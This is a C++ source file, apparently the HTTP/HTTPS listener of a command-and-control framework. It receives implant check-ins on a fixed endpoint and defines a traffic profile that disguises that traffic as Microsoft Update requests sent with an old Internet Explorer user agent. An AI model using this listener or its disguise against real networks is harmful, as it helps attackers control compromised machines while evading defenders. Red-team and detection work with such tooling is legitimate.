#include "ListenerHttp.hpp"


using namespace std;
using namespace httplib;


const std::string HttpsEndPoint = "/HttpsEndPoint";
const std::string HttpEndPoint = "/HttpEndPoint";


json httpGet = {
	{"http-get", {
		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
		{"client", {
			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
		}},
		{"server", {
			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
		}}
  	}},
	{"http-post", {
		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
		{"client", {
			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
		}},
		{"server", {
			{"header", {"User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0;Windows NT 5.1)", "Content-Type: application/octet-stream", "Accept-Encoding: gzip, deflate"}}
		}}
  	}}
};


ListenerHttp::ListenerHttp(const std::string& ip, int localPort, bool isHttps)
	: Listener(ip, localPort, (isHttps==true) ? ListenerHttpsType : ListenerHttpType)
	, m_isHttps(isHttps)
{	


	if(m_isHttps)
		m_svr = std::make_unique<httplib::SSLServer>("./cert.pem", "./key.pem");
	else
		m_svr = std::make_unique<httplib::Server>();

	this->m_httpServ = std::make_unique<std::thread>(&ListenerHttp::lauchHttpServ, this);
}


ListenerHttp::~ListenerHttp()
{
	m_svr->stop();
	m_httpServ->join();
}


void ListenerHttp::lauchHttpServ()
{
	httplib::Response res;

	if(m_isHttps)
	{
		m_svr->set_pre_routing_handler([&](const auto& req, auto& res) 
		{

			std::cout << req.path << std::endl;
			if (req.path != HttpsEndPoint) 
			{
				res.status = 401;
				return Server::HandlerResponse::Handled;
			}
			else
			{
				try 
				{
					this->HandleCheckIn(req, res);
				} 
				catch (...) 
				{
					res.status = 401;
					// res.set_content("toto", "text/html");
					return Server::HandlerResponse::Handled;
				}
			}
		});

	}
	else
	{
		m_svr->set_pre_routing_handler([&](const auto& req, auto& res) 
		{
			std::cout << req.path << std::endl;

			if (req.path != HttpEndPoint) 
			{
				res.status = 401;
				return Server::HandlerResponse::Handled;
			}
			else
			{
				try 
				{
					this->HandleCheckIn(req, res);
				} 
				catch (...) 
				{
					res.status = 401;
					// res.set_content("toto", "text/html");
					return Server::HandlerResponse::Handled;
				}
			}
		});

	}

	m_svr->listen(m_host.c_str(), m_port);
}


int ListenerHttp::HandleCheckIn(const httplib::Request& req, httplib::Response& res)
{
	string input = req.body;

	DEBUG("m_isHttps " << std::to_string(m_isHttps));
	DEBUG("input.size " << std::to_string(input.size()));

	string output;
	bool ret = handleMessages(input, output);

	if(m_isHttps)
	{
		httplib::Headers httpsServerHeaders = {
			{ "Accept-Encoding", "gzip, deflate" },
			{ "User-Agent", "https server agent" }
			};

		res.headers = httpsServerHeaders;
	}
	else
	{
		httplib::Headers httpServerHeaders = {
		{ "Accept-Encoding", "gzip, deflate" },
		{ "User-Agent", "http server agent" }
		};

		res.headers = httpServerHeaders;
	}

	DEBUG("output.size " << std::to_string(output.size()));

	if(ret)
		res.body = output;
	else
		res.status = 200;

	return 0;
}
